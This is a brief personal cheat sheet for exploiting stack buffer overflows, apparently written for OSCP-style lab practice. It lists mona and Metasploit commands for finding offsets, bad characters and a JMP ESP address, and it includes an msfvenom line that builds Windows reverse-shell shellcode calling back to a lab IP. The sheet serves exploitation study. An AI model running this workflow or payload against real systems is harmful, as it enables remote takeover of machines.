# Buffer Overflow

> Shahrukh Tramboo | February 26th, 2022

--------------------------------------

**Mona Configuration**

```bash
!mona config -set workingfolder c:\mona\%p
```

**create pattern**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```


**getting pattern offset**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
```
or
```bash
!mona findmsp -distance 600
```

**create a bytearray**

using bpython
```
bytearray(range(1,256))
```

**Finding a Jump Point**

```bash
!mona jmp -r esp -cpb "\x00"
```

**Generate Payload**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.17.39.185 LPORT=4444 EXITFUNC=thread -b "\x07\x2d\x2e\xa0" -f py -v shellcode
```


**Finding Bad Characters**

```bash
!mona bytearray -b "\x00"
```

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:

```bash
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Make a note of the address to which the ESP register points and use it in the following mona command:

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

**Check modules**
```bash
!mona modules
```

